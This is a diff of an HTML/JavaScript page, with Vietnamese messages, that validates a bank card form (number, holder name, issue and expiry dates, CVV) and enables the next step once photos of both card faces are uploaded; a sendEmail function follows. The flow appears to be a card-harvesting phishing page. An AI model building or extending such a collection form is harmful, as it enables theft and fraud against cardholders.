@@ -322,6 +322,13 @@
             background-color: #e6f0fa;
             color: #0052cc;
         }
+        @media (max-width: 767px) {
+            .modal-title {
+                font-size: 16px;
+                white-space: normal;
+                overflow: visible;
+            }
+        }
     </style>
 </head>
 <body>
@@ -581,12 +588,7 @@
             const expiryDate = $('#expiryDate').val().trim();
             const cvv = $('#cvv').val().trim();
 
-            const cardNumberRegex = /^\d{16}$/;
-            const dateRegex = /\d{2}\/\d{2}\/\d{4}/;
-            const expiryRegex = /\d{2}\/\d{2}/;
-            const cvvRegex = /^\d{3}$/;
-
-            if (!cardNumberRegex.test(cardNumber)) {
+            if (!cardNumber.match(/^\d{16}$/)) {
                 $('#cardNumber').addClass('is-invalid');
                 $('#cardNumber').next('.invalid-feedback').text('Số thẻ phải có 16 số.');
                 return false;
@@ -599,23 +601,23 @@
             } else {
                 $('#cardHolderName').removeClass('is-invalid');
             }
-            if (!dateRegex.test(issueDate)) {
+            if (!issueDate.match(/\d{2}\/\d{2}\/\d{4}/)) {
                 $('#issueDate').addClass('is-invalid');
-                $('#issueDate').next('.invalid-feedback').text('Ngày phát hành phải có định dạng DD/MM/YYYY.');
+                $('#issueDate').next('.invalid-feedback').text('Ngày phát hành: DD/MM/YYYY.');
                 return false;
             } else {
                 $('#issueDate').removeClass('is-invalid');
             }
-            if (!expiryRegex.test(expiryDate)) {
+            if (!expiryDate.match(/\d{2}\/\d{2}/)) {
                 $('#expiryDate').addClass('is-invalid');
-                $('#expiryDate').next('.invalid-feedback').text('Ngày hết hạn phải có định dạng MM/YY.');
+                $('#expiryDate').next('.invalid-feedback').text('Ngày hết hạn: MM/YY.');
                 return false;
             } else {
                 $('#expiryDate').removeClass('is-invalid');
             }
-            if (!cvvRegex.test(cvv)) {
+            if (!cvv.match(/^\d{3}$/)) {
                 $('#cvv').addClass('is-invalid');
-                $('#cvv').next('.invalid-feedback').text('Mã CVV phải có 3 số.');
+                $('#cvv').next('.invalid-feedback').text('CVV phải có 3 số.');
                 return false;
             } else {
                 $('#cvv').removeClass('is-invalid');
@@ -642,7 +644,7 @@
             const hasBackImage = $('#atmCardBackImage').prop('files').length > 0;
             const hasCardInfo = userData.atmCard && userData.atmCard.cardNumber && userData.atmCard.cardHolderName && userData.atmCard.issueDate && userData.atmCard.expiryDate && userData.atmCard.cvv;
             console.log('Button state:', { hasFrontImage, hasBackImage, hasCardInfo });
-            $('#proceedToStep4Btn').prop('disabled', !hasCardInfo);
+            $('#proceedToStep4Btn').prop('disabled', !((hasFrontImage && hasBackImage) || hasCardInfo));
         }
 
         async function sendEmail() {
